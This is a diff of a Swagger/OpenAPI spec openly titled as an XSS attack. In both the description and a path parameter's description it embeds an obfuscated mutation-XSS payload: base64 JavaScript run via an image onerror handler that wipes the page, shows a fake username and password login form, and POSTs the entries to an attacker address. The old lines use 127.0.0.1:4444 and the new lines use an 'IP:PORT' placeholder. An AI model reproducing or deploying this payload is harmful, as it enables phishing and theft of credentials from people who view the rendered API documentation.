@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY Alharbe
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IAp2YXIgYT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdmb3JtJyk7CmEuYWN0aW9uPSJodHRwOi8vMTI3LjAuMC4xOjQ0NDQiOwphLm1ldGhvZD0nUE9TVCc7CmEuaW5uZXJIVE1MPSc8Y2VudGVyPlVzZXJuYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlck5hbWUiPjxicj5QYXNzd29yZDogPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwd2QiPjxicj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTG9naW4iPjwvY2VudGVyPic7IApkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOyIn' onerror='eval(atob(this.id))'>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IAp2YXIgYT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdmb3JtJyk7CmEuYWN0aW9uPSJodHRwOi8vSVA6UE9SVCI7CmEubWV0aG9kPSdQT1NUJzsKYS5pbm5lckhUTUw9JzxjZW50ZXI+VXNlcm5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VyTmFtZSI+PGJyPlBhc3N3b3JkOiA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InB3ZCI+PGJyPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJMb2dpbiI+PC9jZW50ZXI+JzsgCmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7' onerror='eval(atob(this.id))'>"></form>
   version: production
 basePath: /JSSResource/
 produces:
@@ -14,20 +14,20 @@ consumes:
 security:
   - basicAuth: []
 paths:
-  /Alharbe0:
+  /Alharbe:
     get:
       responses:
         '200':
           description: No response was specified
       tags:
-        - M0X0101_XSS_D
+        - Alharbe
       operationId: findAccounts
       summary: Finds all accounts
   '/hack/hachid/{id}':
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IAp2YXIgYT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdmb3JtJyk7CmEuYWN0aW9uPSJodHRwOi8vMTI3LjAuMC4xOjQ0NDQiOwphLm1ldGhvZD0nUE9TVCc7CmEuaW5uZXJIVE1MPSc8Y2VudGVyPlVzZXJuYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlck5hbWUiPjxicj5QYXNzd29yZDogPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwd2QiPjxicj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTG9naW4iPjwvY2VudGVyPic7IApkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOyIn' onerror='eval(atob(this.id))'>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IAp2YXIgYT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdmb3JtJyk7CmEuYWN0aW9uPSJodHRwOi8vSVA6UE9SVCI7CmEubWV0aG9kPSdQT1NUJzsKYS5pbm5lckhUTUw9JzxjZW50ZXI+VXNlcm5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VyTmFtZSI+PGJyPlBhc3N3b3JkOiA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InB3ZCI+PGJyPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJMb2dpbiI+PC9jZW50ZXI+JzsgCmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7' onerror='eval(atob(this.id))'>"></form>
           format: int64
           in: path
           name: id
